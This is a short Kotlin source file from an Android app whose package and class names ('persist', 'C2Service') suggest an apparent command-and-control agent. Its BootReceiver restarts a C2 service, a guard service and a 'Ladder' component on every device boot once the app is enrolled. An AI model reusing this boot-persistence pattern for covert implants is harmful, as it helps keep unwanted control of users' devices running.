package ai.obsidian.agent.persist

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.svc.C2Service
import ai.obsidian.agent.svc.GuardService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val app = context.applicationContext as AgentApp
        if (!app.cfg.enrolled) return
        C2Service.start(context)
        GuardService.start(context)
        Ladder.arm(context)
        app.audit.info("boot", intent.action.orEmpty())
    }
}
